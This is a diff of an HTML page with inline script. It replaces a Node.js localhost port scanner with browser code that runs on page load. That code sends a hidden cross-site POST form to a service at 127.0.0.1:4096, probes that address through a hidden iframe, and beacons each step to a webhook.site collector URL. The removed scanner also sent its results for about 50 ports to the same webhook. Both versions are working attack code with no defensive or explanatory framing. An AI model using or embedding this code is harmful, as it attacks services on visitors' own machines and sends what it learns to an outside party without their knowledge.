@@ -1,123 +1,31 @@
 <!doctype html>
 <meta charset="utf-8">
 <script>
-const http = require('http');
-const https = require('https');
+const EXFIL = 'https://webhook.site/071c3611-058a-4ec0-a687-589cea6192db';
+function log(s){ new Image().src = EXFIL + '/?s=' + encodeURIComponent(s) + '&t=' + Date.now(); }
 
-// 50 个常用 TCP 端口（可根据需要修改）
-const commonPorts = [
-  21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
-  1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9000, 9200, 27017,
-  5000, 7001, 8000, 8008, 8081, 8888, 9001, 9090, 10000, 11211, 27018,
-  28017, 3478, 5060, 5061, 5222, 5269, 5280, 5433, 6371, 7474, 7687, 8089
-].slice(0, 50);
+window.onload = () => {
+  log('start');
 
-const baseHost = '127.0.0.1';
-const path = '/session';
-const body = JSON.stringify({});
+  const f1 = document.createElement('iframe');
+  f1.name = 'x';
+  f1.style.display = 'none';
+  document.body.appendChild(f1);
 
-const headers = {
-  'User-Agent': 'Mozilla/5.0 (Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
-  'Connection': 'close',
-  'Content-Type': 'application/json',
-  'Accept-Encoding': 'gzip, deflate',
-  'Content-Length': Buffer.byteLength(body)
+  const form = document.createElement('form');
+  form.method = 'POST';
+  form.action = 'http://127.0.0.1:4096';
+  form.target = 'x';
+  form.style.display = 'none';
+  document.body.appendChild(form);
+  form.submit();
+  log('csrf-start-sent');
+
+  const f2 = document.createElement('iframe');
+  f2.style.display = 'none';
+  f2.onload = () => log('root-onload');
+  f2.onerror = () => log('root-onerror');
+  f2.src = 'http://127.0.0.1:4096/';
+  document.body.appendChild(f2);
 };
-
-// Webhook 配置
-const webhookUrl = 'https://webhook.site/071c3611-058a-4ec0-a687-589cea6192db';
-
-/**
- * 将扫描结果发送到 webhook.site
- * @param {object} data 要发送的数据
- */
-function sendToWebhook(data) {
-  const url = new URL(webhookUrl);
-  const payload = JSON.stringify(data);
-  const options = {
-    hostname: url.hostname,
-    port: url.port || (url.protocol === 'https:' ? 443 : 80),
-    path: url.pathname,
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-      'Content-Length': Buffer.byteLength(payload)
-    }
-  };
-
-  const client = url.protocol === 'https:' ? https : http;
-  const req = client.request(options, (res) => {
-    // 不关心响应，静默完成
-    res.resume();
-  });
-  req.on('error', (err) => {
-    console.error(`外发 webhook 失败: ${err.message}`);
-  });
-  req.write(payload);
-  req.end();
-}
-
-/**
- * 向指定端口发送 POST 请求
- * @param {number} port 目标端口
- * @returns {Promise<object>} 请求结果
- */
-function sendRequest(port) {
-  return new Promise((resolve) => {
-    const options = {
-      hostname: baseHost,
-      port: port,
-      path: path,
-      method: 'POST',
-      headers: headers,
-      timeout: 5000
-    };
-
-    const req = http.request(options, (res) => {
-      let rawData = '';
-      res.on('data', (chunk) => { rawData += chunk; });
-      res.on('end', () => {
-        const result = { port, statusCode: res.statusCode, error: null };
-        console.log(`[+] 端口 ${port} -> 状态码: ${res.statusCode}`);
-        resolve(result);
-      });
-    });
-
-    req.on('error', (err) => {
-      const result = { port, statusCode: null, error: err.message };
-      console.log(`[-] 端口 ${port} -> 错误: ${err.message}`);
-      resolve(result);
-    });
-
-    req.on('timeout', () => {
-      req.destroy();
-      const result = { port, statusCode: null, error: 'timeout' };
-      console.log(`[-] 端口 ${port} -> 超时`);
-      resolve(result);
-    });
-
-    req.write(body);
-    req.end();
-  });
-}
-
-/**
- * 顺序扫描所有端口，每得到一个结果就外发到 webhook
- */
-async function scanPorts() {
-  console.log(`开始扫描 ${commonPorts.length} 个常用端口...\n`);
-  for (const port of commonPorts) {
-    const result = await sendRequest(port);
-    // 将结果异步发送到 webhook（不等待）
-    sendToWebhook(result);
-    // 适当延迟，避免触发目标系统的连接频率限制
-    await new Promise(resolve => setTimeout(resolve, 100));
-  }
-  // 扫描完成后发送一条完成通知
-  sendToWebhook({ event: 'scan_finished', timestamp: new Date().toISOString() });
-  console.log('\n扫描完成。');
-}
-
-// 执行扫描
-scanPorts();
 </script>
